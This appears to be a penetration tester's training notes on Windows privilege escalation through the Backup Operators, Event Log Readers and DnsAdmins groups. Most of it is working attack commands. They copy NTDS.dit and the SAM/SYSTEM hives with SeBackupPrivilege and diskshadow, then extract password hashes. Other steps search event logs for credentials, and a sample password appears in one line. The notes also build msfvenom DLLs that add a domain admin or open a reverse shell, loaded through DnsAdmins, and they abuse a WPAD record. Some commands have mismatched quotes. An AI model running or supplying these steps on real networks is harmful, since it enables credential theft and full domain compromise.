Backup Operators 
	[SeBackup Privilege]([https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges))
		Allows to traverse any folder and list contents and copy a file from a folder even with no ACE. 
		Need to copy the data specifying the [FILE_FLAG_BACKUP_SEMANTICS](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
			Exploiting privilege 
			https://github.com/giuliano108/SeBackupPrivilege
			Import the Libraries:
				`Import-Module .\SeBackupPrivilegeUtils.dll`
				`Import-Module .\SeBackupPrivilegeCmdLets.dll`
			Turn on the privileges 
				`whoami /priv`
				`Get-SeBackupPrivilige`
				`Set-SeBackupPrivilege`
			Copy a protected file 
				`Copy-FileSeBackupPrivilege '<path to file>' .\<filename>.txt`
			Read the file
			Use [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to attack a domain controller with NTDS.dit
				Contains all the NTLM hashes for all users in the domain.
				Use diskshadow utility to create a copy of the C drive and expose it in the E drive
				`diskshadow.exe`
				`set verbose on`
				`set metadata`
				`set context clientaccesible`
				`set contect persistent`
				`begin backup`
				`add volume C: alias cdrive`
				`create`
				`expose %cdrive%` E:
				`end backup`
				`exit`
				`dir E:`	`
			Bypass the ACL and copy the NTDS locally
				`Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
			Extract credentials from NTDS.dit
				`Import-Module .\DSInternals.psd1`
				`$key = Get-BootKey -SystemHivePath .\SYSTEM'
				`Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key`
				Using SecretsDump.py
					`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL'
				CopyFiles with Robocopy
					`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
		Backup the SAM and SYSTEM registry hives.
			`reg save HKLM\SYSTEM SYSTEM.SAV`
			`reg save HKLM\SAM SAM.SAV`
[Event Log Readers](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers>)
	Confirm group membership 
		`net localgroup "Event Log Readers"`
	Query windows events using [wevutil (CMD)](<Windows/PrivEsc/Windows Group Privileges.md>) Or [Get-WinEvent(PS)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3&viewFallbackFrom=powershell-7.1)
		Search for security Logs. 
			CMD
				`wevtutil qe Security /rd:true /f:text | Select-String "/user"
			Powershell
				`Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
		Pass Credentials to wevutil 
			`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
DNS Admins
	DNS service runs as "NT AUTHORITY/ SYSTEM"
	Use [DNSCMD](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)to run an [exploit](https://adsecurity.org/?p=4064)
		Explanation
			DNS management is performed over RPC 
			[ServerLevelPluginDLL](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows custom DLL with no verification to be loaded in with [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) tool from CLI.	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` populates a registry key.
			When the DNS service is restarted the DLL path will be loaded. Custom DLL can obtain a reverse shell. 
			Very destructive action.
		Running the exploit:
			Generate malicious DLL:
				`msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll'
				`msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= --platform=windows -f dll > reverseshell.dll`
			Transfer file across to target 
			Load DLL as Non-Privileged User:
				Only DnsAdmins can do this.
				`dnscmd.exe /config /serverlevelplugindll <path to dll>
			Load DLL as member of DnsAdmins:
				`Get-ADGroupMember -Identity DnsAdmins`
			Load Custom DLL:
				` dnscmd.exe /config /serverlevelplugindll <path to dll>
				(Must specify full path)
			Find Users SID
				`wmic useraccount where name="netadm" get sid`
			Check permissions on DNS service
				`sc.exe sdshow DNS`
					[Understand the output](https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/)
			Stop the DNS service
				`sc stop dns
			Start the DNS service
				`sc start dns`
			Confirm account has been added to the Domain Admins
				`net group "Domain Admins" /dom`
			Check DNS
				`sc query` 
		Cleaning up:
			Confirm registry key is added 
				`reg query \\<ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
			Delete Registry key 
				`reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`
			Start the DNS service again
				`sc.exe start dns`
			Check the DNS 
				`sc query dns`
		[Exploit](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) using [Mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
			Modify this [file](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) to execute a reverse shell one-liner 
		Exploit using a WPAD Record 
			Allows disabling of [global query block security](https://learn.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
			Running the exploit
				Disable the global query block list
					`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`
				Add a WDAP record 
					`Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain name>.local -ComputerName dc01.<domain name>.local -IPv4Address <ip>`
s